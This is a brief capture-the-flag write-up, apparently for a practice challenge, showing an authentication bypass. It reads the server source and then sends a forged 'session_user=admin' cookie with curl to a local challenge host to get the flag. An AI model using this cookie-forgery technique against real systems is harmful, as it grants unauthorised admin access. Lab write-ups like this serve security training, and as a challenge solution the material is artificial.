# Authentication Bypass 2

```shell
cat /challenge/server
```

The GET request expects a cookie "session_user" /
If it is absent, login page is displayed. If present and equal to "admin" flag is displayed /

```shell
curl -v --cookie "session_user=admin" http://challenge.localhost/
```
